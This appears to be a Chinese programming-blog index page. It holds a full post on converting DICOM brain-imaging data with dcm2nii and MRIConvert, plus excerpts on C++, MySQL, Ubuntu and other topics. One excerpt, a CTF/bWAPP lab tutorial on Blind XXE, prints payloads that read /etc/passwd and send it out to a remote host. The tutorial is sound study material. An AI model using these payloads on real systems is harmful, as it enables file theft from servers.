目前，脑成像数据主要有DTI、fmri、3D三种模态。这些数据在分析前都要进行格式转换，不同公司的扫描仪存储格式也不尽相同。脑成像处理软件也很多，不同软件使用的格式也不一样，所以数据转换是脑成像数据处理的第一步，必须非常清楚。这里主要以siemens的机器为准，介绍在windowx下的MRIcron的dcm2nii转换和MRIConvert转换.
从扫描中心下载的原始数据是以dicom数据格式存在的压缩文件，解压后，得到原始文件。来自siemens的扫描仪的原始文件以“IMA”下为后缀。对于功能像（fMRI）的数据，有多少个TR就有多少个IMA图像文件，即每个IMA文件就是一个完整的volume；对于DTI数据，有n个方向，有m个b0像，就有n+m张IMA图片，即n+m个完整的volume。当然有的DTI数据有的只有一个b0像，有的有6个b0像之多。对于3D结构像数据，如果扫描了128层，就会有128张IMA图像，每张图像就是一张slice，不是volume。
数据转换后，主要有spm2之前使用的Analyze格式，以及fsl和spm5和spm8使用的NifTI_1格式。Analyze格式是成对的hdr和img文件表示一个3D的volume，而NifTI_1格式可以是3D也可以是4D的，同时可以是hdr和img成对文件，也可以是NifTI_1的nii一个文件。如下：Spm2使用3D Analyze hdr/img；spm5和spm8使用3D NifTI hdr/img.fsl使用NifTI_1的4D的nii格式。
目前数据转换主要有MRIcron的dcm2nii转换和MRIConvert转换。
现在一一介绍一下：
在MRIcron的安装目录下，有一个dcm2nii.exe和dcm2niigui.exe，并且分别有：dcm2nii.nii和dcm2niigui.nii两个配置文件。dcm2nii.exe是Dos的命令行操作，而dcm2niigui.exe是图形界面。我们首先看一下配置文件，用Notepad软件打开，找到一下参数设置：
ManualNIfTIConv=1
EveryFile=1 #“1”目录下所有文件都要进行转换
[INT]
MinReorientMatrix=255 #这个参数设置为255，不要改动
MaxReorientMatrix=1023
其他的参数可以不用管，后面打开界面的时候还可以进行设置。点击dcm2niigui.exe，就打开了界面。
首先在output format中选择输出格式：spm5（3D NifTI hdr/img）或者conpressed fsl（4D NifTI nii）格式。
然后在下拉菜单help中点击reference，设置输出文件的名字，确保把不同被试的数据区分开。另外一定勾上进行图像的reorient。这个参数比较重要，确定MinReorientMatrix=255后，这个参数表示只对3D结构像进行reorient.DTI和fMRI数据本身不能进行reorient，这会破坏DTI和fMRI数据的图像信息。DTI和fMRI数据的纬度都小于255。3D结构像一般是256×256 matrix，fMRI 是64x64matrix 和DTI是128x128matrix。另外一个参数Recursive Folder Search Depth意思是递归转换文件夹下几级的文件夹中的数据。如“5”则表示当前文件夹下的5级文件夹的数据也要一起转换。这个可以根据你自己存放数据的结构填写。
然后从下拉菜单file中选择DICOM to NifTI,浏览到原始数据所在文件夹，然后点击确定，就开始进行数据转换了。dcm2nii转换完后，3D结构像生成原文件、o开头、co开头的文件。其中o开头的文件主要是进行了reorient的，而co是经过切割了neck的。一般用于空间normalize都选用co开头的文件。Fmri的文件数是TR number乘以2,而DTI文件数则是（m+n）*2.
关于MRIconvert转换，从网站直接下载后解压，就可以用了。直接点击MRIconvert.exe,就打开了界面，非常友好。右侧有6个按钮，选择原始数据或者原始数据所在文件夹和数据输出目录，options中可以对输出文件名字进行设置，还可以重新命名。中间下拉菜单选择输出格式，spm5和spm8选择NIFTI，一目了然。然后点击右下角的convert all,就搞定了。MRIconvert转换不对3D图像进行reorient，所以没有o开头和co开头的文件。后续处理还需要对方向进行转换。
另外有人说dcm2nii对DTI数据的转换好像有一些问题，所以建议用MRIconvert对DTI数据进行转换。
MRIconvert和MRIcron的下载链接如下：
http://lcni.uoregon.edu/~jolinda/MRIConvert/
http://www.cabiatl.com/mricro/mricron/dcm2nii.html
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b9e739680c37007f8806302eb092b0e0/" rel="bookmark">
			无法解析的外部符号 _transfer_8to16copy_3dne
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		: error LNK2019: 无法解析的外部符号 _fdct_sse2_skal，该符号在函数 _xvid_gbl_init 中被引用
: error LNK2019: 无法解析的外部符号 _transfer_8to16copy_mmx，该符号在函数 _xvid_gbl_init 中被引用
: error LNK2019: 无法解析的外部符号 _transfer_8to16copy_3dne，该符号在函数 _xvid_gbl_init 中被引用
: error LNK2019: 无法解析的外部符号 _transfer_16to8copy_mmx，该符号在函数 _xvid_gbl_init 中被引用
: error LNK2019: 无法解析的外部符号 _transfer_16to8copy_3dne，该符号在函数 _xvid_gbl_init 中被引用
: error LNK2019: 无法解析的外部符号 _transfer_8to16sub_mmx，该符号在函数 _xvid_gbl_init 中被引用
mem_transfer_3dne.asm
ALIGN SECTION_ALIGN
transfer_16to8copy_3dne:
mov _EAX, prm2 ; Src
mov TMP0, prm1 ; Dst
mov TMP1, prm3 ; Stride
movq mm0, [byte _EAX+0*32]
packuswb mm0, [_EAX+0*32+8]
movq mm1, [_EAX+0*32+16]
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b9e739680c37007f8806302eb092b0e0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/df1ae92efa70fd76e65f2e2a09e9fb53/" rel="bookmark">
			多线程爬虫案例
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.目标网站：https://www.1point3acres.com/bbs/forum-28-1.html此处开始的若干页
2.首先创建两个队列，一个页面队列和一个用于I/O的队列。顺便创建个锁，防止写的时候出问题
page_queue = Queue() joke_queue = Queue() gLock = threading.Lock() 3.用CSV存储数据
fp = open('asd.csv','a+',newline='',encoding='utf-8') url = 'https://www.1point3acres.com/bbs/forum-28-1.html' writer = csv.writer(fp) writer.writerow(('标题','链接')) 4.寻找最大页码
max_page = find_max_page(url) def find_max_page(url): selector = comp(url) max_page = selector.xpath('//div[@class="pg"]//span/text()') if max_page : max_page = max_page[0] max_page = int(re.findall('\d+',max_page)[0]) return max_page else: return 5.循环如栈，把页压入队列内
for x in range(1,max_page): url = 'https://www.1point3acres.com/bbs/forum-28-{}.html'.format(x) page_queue.put(url) for x in range(4): t = BSSpider(page_queue,joke_queue) t.start() for x in range(4): t = BSWriter(joke_queue,writer,gLock) t.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/df1ae92efa70fd76e65f2e2a09e9fb53/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/37ef82961511e4fdca61c721763ce39b/" rel="bookmark">
			设计模式：可复用面向对象软件及基础：4-3 类行为模式:解释器模式（Interpreter）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		概念
角色和职责
Context
解释器上下文环境类。用来存储解释器的上下文环境，比如需要解释的文法等。
AbstractExpression 解释器抽象类。
ConcreteExpression
解释器具体实现类。
案例
#include &lt;iostream&gt; using namespace std; #include "string" class Context { public: Context(int num) { m_num = num; } public: void setNum(int num) { m_num = num; } int getNum() { return m_num; } void setRes(int res) { m_res = res; } int getRes() { return m_res; } private: int m_num; int m_res; }; class Expression { public: virtual void interpreter(Context *context) = 0; }; class PlusExpression : public Expression { public: virtual void interpreter(Context *context) { int num = context-&gt;getNum(); num ++ ; context-&gt;setNum(num); context-&gt;setRes(num); } }; class MinusExpression : public Expression { public: virtual void interpreter(Context *context) { int num = context-&gt;getNum(); num -- ; context-&gt;setNum(num); context-&gt;setRes(num); } }; void main() { Context *pcxt = new Context(10); Expression *e1 = new PlusExpression; e1-&gt;interpreter(pcxt); cout &lt;&lt; "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/37ef82961511e4fdca61c721763ce39b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cf2515dc1af6a738b7b343199247a139/" rel="bookmark">
			双目结构光的三维重建方法（相移法&#43;多频外差相位解包）（含相位代码）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		双目结构光测量系统 顾名思义，双目结构光就是采用两个相机+投影仪的结构，两个相机分别放置在投影仪的两侧。该系统测量原理首先采用投影仪投射设计的光栅编码图案到测量对象表面，然后被双目相机同步采集，两个相机分别对光栅图像做相位解包算法，利用相位信息对双目视觉进行匹配，然后通过双目视觉的重建方式对测量物体重建三维点云。
本博客采用三频外差的方法求解相位信息，然后对双目系统进行去除畸变、立体校正，利用相位对双目进行点对点匹配，然后三维重建点云。
三频外差光栅生成 三组频率分别为76、57、37，76为高频条纹的频率，57为中频条纹的频率，37为低频条纹的频率。其中高频的条纹设置为4步相移，中频和低频的分别设置为3步相移，具体的Matlab生成代码如下：
R = 1140; C = 912; % 光栅尺寸1140*912 P1 = 1140/76; % 频率76的光栅宽度 P2 = 1140/57; % 频率57的光栅宽度 P3 = 1140/37; % 频率37的光栅宽度 a = 126; % 背景光强 b = 126; % 调制光强 I0 = zeros(1140,912); %定义图像尺寸大小 H1 = I0; H2 = I0; H3 = I0; H4 = I0; H5 = I0; H6 = I0; H7 = I0; H8 = I0; H9 = I0; H10 = I0; for i = 1:1140 for j = 1:912 H1(i,j) = a+b*cos(2*pi*(j-1)/P1); %4步相移余弦光栅 --高频 H2(i,j) = a+b*cos(2*pi*(j-1)/P1+1*2*pi/4); H3(i,j) = a+b*cos(2*pi*(j-1)/P1+2*2*pi/4); H4(i,j) = a+b*cos(2*pi*(j-1)/P1+3*2*pi/4); H5(i,j) = a+b*cos(2*pi*(j-1)/P2-2*pi/3); %3步相移余弦光栅 --中频 H6(i,j) = a+b*cos(2*pi*(j-1)/P2); H7(i,j) = a+b*cos(2*pi*(j-1)/P2+2*pi/3); H8(i,j) = a+b*cos(2*pi*(j-1)/P3-2*pi/3); %3步相移余弦光栅 --低频 H9(i,j) = a+b*cos(2*pi*(j-1)/P3); H10(i,j) = a+b*cos(2*pi*(j-1)/P3+2*pi/3); end end %% ----------------------【光栅写出】-------------------------- for k = 1:10 eval(['H','=H',num2str(k),';']); H = uint8(H); img_name = ['gratings/',num2str(k),'.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/cf2515dc1af6a738b7b343199247a139/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9bbd2b0de4c091e091e53d2d50a9b0a5/" rel="bookmark">
			函数重载
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在C++中，可以同时存在多个同名函数，例：
void fun(int a,int b); void fun(int a); void fun(char c); 这3个互为重载函数。
要求：1.函数参数的个数不同，比如第一个和第二个函数。
2.函数参数的类型不同，例如第二个和第三个函数。
函数重载大大加大了函数的灵活性，例如输出函数：
void fun(int a) { cout &lt;&lt; a &lt;&lt; endl; } 此时，因为形参指定为整形，函数调用时实参只能为整形，但是使用函数重载后，有了多种类型的形参，系统自动匹配所调用的函数，则实参也就同时突破了一种类型的限制。
注意点：
1.作用域：函数原型之下。
2.返回值不作为重载的条件。
3.当参数缺省值与函数重载联合使用时，可能出现问题：
void fun(int a,int b = 22); void fun(int a); int main() { fun(12); return 0; } 因为调用对象不明确，无法调用函数，编译失败。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7e23dcaa3a9181909c222160a12cf0b7/" rel="bookmark">
			从几道CTF学习Blind XXE
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		0x00 前言 对于传统的XXE来说，攻击者只有在服务器有回显或报错的情况下才能使用XXE漏洞来读取服务器端文件。 例如
&lt;!ENTITY file SYSTEM "file:///etc/passwd"&gt; &lt;username&gt;&amp;file;&lt;/username&gt; 如果服务器没有回显，只能通过Blind XXE构造一条外带信道来提取数据，也就是数据外带。
一个实例 xml.php
&lt;?php libxml_disable_entity_loader(false); $xmlfile = file_get_contents('php://input'); $dom = new DOMDocument(); $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); ?&gt; test.dtd
&lt;!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/passwd"&gt; &lt;!ENTITY % int "&lt;!ENTITY % send SYSTEM 'http://ip:2333?p=%file;'&gt;"&gt; payload
&lt;!DOCTYPE convert [ &lt;!ENTITY % remote SYSTEM "http://ip/test.dtd"&gt; %remote;%int;%send; ]&gt; 调用过程 %remote请求远程vps上的test.dtd%int调用test.dtd中的%file%file获取服务器上的敏感文件，并传入%send%send将数据发送到远程vps上 这样就实现了外带数据的效果，完美解决了XXE无回显的问题
0x01 bWAPP 下面用bWAPP靶场来示例一下有回显XXE和无回显的区别
有回显XXE 点击Any bugs抓包查看正常请求，可以看到其中的XML文档
利用http协议 payload
&lt;?xml version="1.0" encoding="utf-8"?&gt; &lt;!DOCTYPE test[ &lt;!ENTITY file SYSTEM "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7e23dcaa3a9181909c222160a12cf0b7/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/41efaf84526083bf3bfb64f2fa2b161b/" rel="bookmark">
			动态规划 —— 树形DP
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		【概述】 树形动态规划是在树的数据结构上的动态规划，在各个阶段呈现树状关系的时候可以采用树形 DP，其基本思想是由子节点的信息推出父节点的信息。
树形 DP 中，是通过以下 4 点树的特点来进行建图的：
n 个点，n-1 条边的无向图，任意两顶点间可达无向图中任意两个点间有且只有一条路一个点至多有一个前趋，但可以有多个后继无向图中没有环 【计算顺序】 计算顺序与线性动态规划的顺推、逆推相似，同样有两个方向：
叶 =&gt; 根：在回溯时，从叶节点向上转移状态根 =&gt; 叶：在叶向根 DFS 一遍后（预处理），再重新向下获取答案 【表示方法】 树形 DP 还涉及到建图的问题，如果题目能很清晰的输入一个树，一般使用 vector s[N]，用 s[i] 来保存节点 i 的所有儿子。
当树是一般树且涉及到权值时，一般采用链式存储法，即用结构体数组 edge 存边，edge[i] 表示第 i 条边，head[i] 存以 i 为起点的第一条边（在edge中的下标）
struct Node{ int next; //下一条边的存储下标 int to; //这条边的终点 int w; //权值 }edge[N*2]; //由于是无向图，因此要开2倍 常用的建图方法如下：
int cnt;//边的计数 void Add(int x,int y,int w) {//起点x, 终点y, 权值w edge[cnt].x=x; edge[cnt].w=w; edge[cnt].next=head[x]; head[y]=cnt++; } 遍历以 x 为起点的边时，以 i 开始为第一条边，每次指向下一条(以-1为结束标志)
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/41efaf84526083bf3bfb64f2fa2b161b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2a48d7e965d95d9bd43025ba88bd852e/" rel="bookmark">
			七月历程
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		六月底老师通知让我提前返校，去长春自我隔离一段时间，这几天一直在收拾东西。空余时间没用来学习，不过倒是上 steam 上买了个游戏(QAQ)
2020 是个多灾多难的年份(澳洲火灾，东非蝗虫肆虐，加拿大雪灾，菲律宾火山爆发，克什米尔雪崩，全球疫情)，我只愿世界和平，不由得想到《流浪地球》的台词：
“最初，没有人在意这场灾难，这不过是一场山火，一次旱灾，一个物种的灭绝，一座城市的消失。直到这场灾难和每个人息息相关。”
几天没写东西，心里有点痒痒，可是赶飞机，找住处，写点啥呢？思来想去，有了这篇历程。
以后每月第一天的文章用作每月工作的索引吧，顺便还可以对上月工作做个简单总结～～(机智如我)
六月总结如下： 以前没在意过写文章的作用，学习也不总是记录，可是当我写六月总结的这一刻，我却要很努力的去回想我到底做了什么…(幸好想起来了，不然要 gg)
所以平时总结都要写下来，才是最重要的呀～本月的总结会稍微详细一些，希望 xu 同学翻的时候多反思哦(๑•ั็ω•็ั๑)
我记性一直不好，可能在别人眼里看来就是没心没肺，忘恩负义，过去的人和事，往往忘记的一干二净。所以慢慢懂得了这个博客的重要性。希望她和它可以一直陪伴着我。
总结如下：
学习相似度算法 工程上我们经常需要判断某设备产生的实际波形信号是否能同预先设计的相拟合，但由于实际产生的波形不仅仅是简单的正、余弦波形，而往往是含有较丰富频率分布的不规则波形，而设备元器件本身及外界的电磁干扰又不可避免的引入了干扰噪声，为我们分析其与预先设计波形的拟合程度的判别增加了困难。另外，实际波形和预先设计波形间往往存在着时序上的差别，相位的改变同样也不利于信号的拟合判别。
在信号与系统这门学科中，相关性是一种在时域中对信号特性进行描述的重要方法。由于其通信的功率谱函数是一对傅立叶变换，在信号分析中往往利用它来分析随机信号的功率谱分布，以致不少人一提到相关性马上会联想到信号功率谱的计算，但相关在对确定信号的分析也是有一定应用。由于相关的概念是为研究随机信号的统计特性而引入的，那么从理论上我们也可以将其应用于两个确定信号（一个我们采集到的信号波形和一个理论波形）相似性的研究上。
比较两波行的相似程度需要从相关概念入手。我们想要对两个信号进行比对，不可能说我们打开俩图片然后做对比，肯定是将信号变成数据文件，实际设备输入的波行也可以通过计算机接口采集并将数据存储为数据文件。然后通过相似度分析算法进行比对。
常见相似度分析算法如下：
曼哈顿距离(Manhattan Distance)：两点之间折线距离
2 维空间： ----------------- 假设：A (x1, y1), B (x2, y2) d = abs(x1 - x2) + abs(y1 - y2) ----------------- N 维： ----------------- 假设：A (x1, x2, ..., xn), B (y1, y2, ..., yn), A/B 的坐标集用列表表示 d = sum $ zipWith (\x y -&gt; abs(x - y)) A B ----------------- 欧式距离(Euclidean Distance)：两点之间直线距离
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2a48d7e965d95d9bd43025ba88bd852e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bc6fabb3c7c7c23d4080c15d6004b501/" rel="bookmark">
			C&#43;&#43; 标准程序库std::string 详解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		现在一般不再使用传统的char*而选用C++标准程序库中的string类，是因为string标准程序和char*比较起来，不必担心内存是否足够、字符串长度等等，而且作为一个类出现，集成的操作函数足以完成大多数情况下(甚至是100%)的需要。比如，可以用 = 进行赋值操作，== 进行比较，+ 做串联。尽可以把它看成是C++的基本数据类型。C++是将面向过程的C语言和面向对象的Java语言拼接到一起而组成的一种高级语言。标准模板库（STL）提供了一个std::string类，其是std::basic_string的一个特化，它是一个容器类，可把字符串当作普通类型来使用，并支持比较、连接、遍历、STL算法、复制、赋值等等操作，这个类定义在&lt;string&gt;头文件中。#include &lt;string&gt; //注意这里不是string.h string.h是C字符串头文件 1．声明一个C++字符串
std::string类的构造函数 声明一个字符串变量很简单：string Str;这样就声明了一个字符串变量，但既然是一个类，就有构造函数和析构函数。上面的声明没有传入参数，所以就直接使用了string的默认的构造函数，这个函数所作的就是把Str初始化为一个空字符串。String类的构造函数和析构函数如下： a) string s(); //生成一个空字符串s
b) string s(str) //拷贝构造函数 生成str的复制品string(const string&amp; str)
c) string s(str,stridx) //将字符串str内"始于位置stridx"的部分当作字符串的初值
d) string s(const string&amp; str, size_type pos,strlen) //将字符串str内"始于pos且长度顶多strlen"的部分作为字符串的初值
e) string s(const char *C) //将C字符串作为s的初值
f) string s(const char* str, size_type n) //使用字符串str的前n个字符初始化作为字符串s的初值。
g) string s(int num,char c) //生成一个字符串，包含num个c字符
h) string s(beg,end) //以区间beg;end(不包含end)内的字符作为字符串s的初值
i) s.~string() //销毁所有字符，释放内存
当构造的string太长而无法表达时会抛出length_error异常
2．字符串操作函数
这里是C++字符串的重点，先把各种操作函数罗列出来，不喜欢把所有函数都看完的人可以在这里找自己喜欢的函数，再到后面看他的详细解释。
a) =,assign() //赋以新值
b) swap() //交换两个字符串的内容
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/bc6fabb3c7c7c23d4080c15d6004b501/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ea7af9e95089a224f1c638e2a8f4190d/" rel="bookmark">
			MySQL　四种隔离级别
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Mysql的四种隔离级别
SQL标准定义了4类隔离级别，包括了一些具体规则，用来限定事务内外的哪些改变是可见的，哪些是不可见的。低级别的隔离级一般支持更高的并发处理，并拥有更低的系统开销。
Read Uncommitted（读取未提交内容）
在该隔离级别，所有事务都可以看到其他未提交事务的执行结果。本隔离级别很少用于实际应用，因为它的性能也不比其他级别好多少。读取未提交的数据，也被称之为脏读（Dirty Read）。
Read Committed（读取提交内容）
这是大多数数据库系统的默认隔离级别（但不是MySQL默认的）。它满足了隔离的简单定义：一个事务只能看见已经提交事务所做的改变。这种隔离级别 也支持所谓的不可重复读（Nonrepeatable Read），因为同一事务的其他实例在该实例处理其间可能会有新的commit，所以同一select可能返回不同结果。
Repeatable Read（可重读）
这是MySQL的默认事务隔离级别，它确保同一事务的多个实例在并发读取数据时，会看到同样的数据行。不过理论上，这会导致另一个棘手的问题：幻读 （Phantom Read）。简单的说，幻读指当用户读取某一范围的数据行时，另一个事务又在该范围内插入了新行，当用户再读取该范围的数据行时，会发现有新的“幻影” 行。InnoDB和Falcon存储引擎通过多版本并发控制（MVCC，Multiversion Concurrency Control）机制解决了该问题。
Serializable（可串行化）
这是最高的隔离级别，它通过强制事务排序，使之不可能相互冲突，从而解决幻读问题。简言之，它是在每个读的数据行上加上共享锁。在这个级别，可能导致大量的超时现象和锁竞争。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/756da6dca1dbc5ed11c973f0a15ea96e/" rel="bookmark">
			ROG Zephyrus G14（幻14）Ubuntu 20.04 双系统安装避坑指南（4800H AMD Nvidia GPU核显独显问题，快捷键Fn键盘灯驱动）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 1.G14为什么安装Ubuntu 20.04？2.大致步骤3.遇到的问题4.解决问题 1.G14为什么安装Ubuntu 20.04？ 试着安装18.04没有成功，各种问题，AMD这颗4800HS CPU/GPU以及Intel的AX200 Wifi6无线网卡都太新了,20.04至少可以顺利安装运行GNOME.另外，在Ubuntu 20.04下，经测试CUDA10.2，CUDNN7.6.5，TensorRT7.0.0.11运行正常，OpenCV4.4.0编译正常，OpenCV编译参考我的另一篇文章。
2.大致步骤 留出硬盘的free space准备安装Ubuntu下载Rufus和Ubuntu20.04 ISO镜像烧录到U盘里制作启动盘在FreeSpace上建立Ext4分区，挂载到"/“下,因为我就分配了250GB给Linux,所以为了最有效的利用空间把所有的内容都塞到”/"里面.Bootloader写入WindowsBootLoader,使用grub来引导双系统,所以最好先安装windows系统然后再安装Ubuntu安装Ubuntu 3.遇到的问题 G14的Intel AX200 Wifi6无线网卡无法驱动虽然安装了Nvidia的独显驱动,但是图形界面仍然卡顿lag,系统亮度调节无效键盘Fn功能键全部失效 4.解决问题 Nvidia显卡驱动安装的问题可以参考我的另一篇记录
装好20.04后,我当时的Linux Kernel版本是5.4，经过一些版本的更新,Ubuntu对于Nvidia显卡的驱动安装人性化一些了,如果安装时选择安装第三方的驱动可以跳过繁琐的禁用nouveau驱动等驱动安装过程.
1. 解决Intel AX200 Wifi6无线网卡无法驱动的问题
到Intel官网下载驱动,20.04Kernel版本符合ax200的驱动要求
解压后拷贝到/lib/firmware
然后
sudo add-apt-repository ppa:canonical-hwe-team/backport-iwlwifi sudo apt-get update sudo apt-get install backport-iwlwifi-dkms 安装完毕重启,无线网卡应该可以使用了
2. 解决安装好Nvidia独显驱动后图形界面仍然lag卡顿的问题
使用如下命令查看显卡
sudo lshw -c video 发现4800HS的集成显卡Vega7无法驱动（Unclaimed）,图形界面lag的原因可能就是集显未被正常驱动,所以就着手安装AMD的GPU驱动。
结果试了很多方法，都无效。最后只能尝试升级Linux Kernel，于是乎，就升级到了2020.10.1日当时的最新版本5.8.12.
升级方法：
先到这个Ubuntu官方Kernel FTP下下载最新的Kernel
如图：
把amd64/build下的7个deb都下载下来放到一个文件夹里,然后进入文件夹
sudo dpkg -i *.deb sudo reboot 注意，如果不需要lowlatency的kernel的话可以不安装那几个deb，事实上lowlatency的kernel在我的机器上无法成功启动图形界面。
升级完Kernel在启动的时候选择Advanced中的5.8.12 generic Kernel启动。
至于如何删除相应的旧版Kernel：
uname -sr #查看当前Kernel版本 dpkg -l | grep linux-image | awk '{print$2}' #查看所有Kernel名称 #删除相应不需要的Kernel sudo apt remove --purge linux-image-5.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/756da6dca1dbc5ed11c973f0a15ea96e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/70ccc4d8c27d87632e507f4e28cb5b93/" rel="bookmark">
			引用做参数与引用做返回值
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		引用做参数与引用做返回值 一、引用做参数
引用做参数时，和C语言中的“传址”是一个道理，即通过函数来改变身处主函数中的变量。
例：
void fun(int &amp;b) { b = 22; } int main() { int a = 21; fun(a); return 0; } 执行fun函数后，主函数中的整型变量a的值就变为了22，因为a和b实际上是同一处空间但是有了不同的名字。
可以拓展到交换主函数中变量的值：
void fun(int &amp;a,int &amp;b) { int c = a; a = b; b = c; } int main() { int a = 22; int b = 23; fun(a,b); return 0; } 执行完fun函数后，主函数中的变量a和变量b的值就会交换。
二、引用做返回值
形式：
int&amp; fun() { static int a = 22; return a; } 因为返回值的类型是int&amp;，所以使用一个int变量来装返回值时编译器会报错。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/70ccc4d8c27d87632e507f4e28cb5b93/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/caa658dd29aadf5152ae959922a3ec3f/" rel="bookmark">
			Java零基础系列教程08Java字符串
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		配套视频教程 本文B站配套视频教程
String类位于java.lang包中，具有丰富的方法
字符串的初始化方法 /* * 字符串：就是由多个字符组成的一串数据。也可以看成是一个字符数组。 * 通过查看API，我们可以知道 * A:字符串字面值"abc"也可以看成是一个字符串对象。 * B:字符串是常量，一旦被赋值，就不能被改变。 * * 初始化方法： * public String(): * public String(String original):把字符串常量值转成字符串 * * 字符串的方法： * public int length()：返回此字符串的长度。 */ public class StringDemo { public static void main(String[] args) { // public String(): String s1 = new String(); System.out.println("s1:" + s1); System.out.println("s1.length():" + s1.length()); System.out.println("--------------------------"); //s1: //s1.length():0 //public String(String original):把字符串常量值转成字符串 String s6 = new String("abcde"); System.out.println("s6:" + s6); System.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/caa658dd29aadf5152ae959922a3ec3f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cc21e121617d4869761f4eddd953f8bf/" rel="bookmark">
			双系统时间不一致解决方案
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		简介 本文主要介绍使用双系统（Windows 和 Ubuntu）时，如何解决时间不一致的问题。本文提供 Windows 下和 Linux 下两种解决方案，选择方便的方案进行即可。
问题原因 该问题出现是因为Windows和Linux对待硬件时间的处理方法不同（注意是硬件时间，这也就是为什么时间异常时点击与服务器同步就能恢复的原因），Linux将硬件时间看作UTC时间，因此在中国的时区条件下会加上8个小时作为系统时间，Windows则将硬件时间直接作为系统时间。这也就是为什么，双系统切换时会存在8个小时的差距。
Windows下解决方案 右击左下角的开始图标选择以管理员身份打开Windows Powershell（Win7及以前的Windows版本使用CMD），然后输入下面的命令，显示执行成功后重启Window系统即可。
Reg add HKLM\SYSTEM\CurrentControlSet\Control\TimeZoneInformation /v RealTimeIsUniversal /t REG_DWORD /d 1 这个命令的效果是将Windows识别硬件时间为UTC-0而不是现在的UTC+8，方法是将注册表HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\TimeZoneInformation\中添加一项数据类型为REG_DWORD，名称为RealTimeIsUniversal，值设为1。
Ubuntu下解决方案 通过修改硬件同步的方法来进行双系统同步，具体命令如下。其操作流程为安装ntpdate、连接到Windows的时间服务器、更新硬件，操作完成后重启系统。
sudo apt-get install ntpdate sudo ntpdate time.windows.com sudo hwclock --localtime --systohc 补充说明 使用了两种在两个系统下操作的主流方法，经测试两种方法都是有效的，解决该问题选择其中一种方案即可。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/caf186845ea163846ef54c2d5896da0f/" rel="bookmark">
			arduino&#43;HC-SR04&#43;红外接收&#43;LCD1602&#43;led控制   实验报告
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、 实验目的
(1)理解硬件串口的使用及相关函数
(2)实现类库的编写，并实现超声波传感器的测距功能，可以考虑当距离达到阈值时，点亮LED灯
(3)熟悉硬件串口的使用方法，实现read、peek、print、write等函数功能
(4)实现串口通讯，用RGB LED进行多色彩的变换
二、 实验环境
Arduino IDE 1.8.13
实验画图软件 fritzing 0.8.7
三．实验过程（主要步骤和结果）
接线部分
总连线图：
超声波部分接线：
Trig&gt;&gt;7
Echo&gt;&gt;6
红外接收模块连线
Lcd1602部分连线（lcd1602第一行可以显示超声波模块测得的距离，单位厘米，电位器可以控制lcd1602分辨率）
Led灯部分连线（蓝色灯由遥控控制，黄色灯由超声波感应距离控制，距离小于3cm灯亮，距离大于3cm灯灭）
程序部分
完整程序代码：
